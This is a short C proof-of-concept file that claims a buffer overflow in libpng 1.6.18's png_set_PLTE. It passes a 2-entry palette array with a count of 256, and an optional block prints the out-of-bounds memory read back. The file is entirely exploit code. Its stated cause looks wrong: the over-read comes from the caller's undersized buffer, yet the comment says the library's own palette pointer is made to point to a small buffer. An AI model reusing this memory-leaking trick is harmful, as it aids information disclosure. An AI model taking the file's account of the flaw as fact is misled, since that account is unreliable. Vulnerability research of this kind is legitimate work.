#include "libpng-1.6.18/png.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
Welcome to our PoC for the vulnerability in png_set_PLTE 
this is the vulnerable line : 
memcpy(png_ptr->palette, palette, num_palette * (sizeof (png_color)));
The issue is that if we make our png_ptr -> palette point to a very small buffer 
but lie about the num_palette we have the code will memcpy into a too small buffer 
and cause a buffer overflow 
*/


int main() {
    png_structp png_ptr = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    png_infop info_ptr = png_create_info_struct(png_ptr);

    // Simulate a fake palette buffer that’s too small
    png_color small_palette[2];  // Only 2 entries, but we’ll lie and say 256

    // Intentionally pass an oversized count to trigger memcpy overflow
    // the PNG_MAX_PALETTE_LENGTH is 256, therefore we pass 256
    png_set_PLTE(png_ptr, info_ptr, small_palette, 256);
#ifdef LEAK_MEM
    // Get these newly appointed values 
    png_colorp palette;
    int num_palette;

    if (png_get_PLTE(png_ptr, info_ptr, &palette, &num_palette) & PNG_INFO_PLTE) {
        printf("Palette has %d entries\n", num_palette);
        // You can now read the values from `palette`, 
        // most of them are completely out of bounds
        for (int i = 0; i < num_palette; i++) {
            printf("Color %d: R=%d, G=%d, B=%d\n", i,
                   palette[i].red,
                   palette[i].green,
                   palette[i].blue);
        }
    }
#endif

    png_destroy_read_struct(&png_ptr, &info_ptr, NULL);
    return 0;
}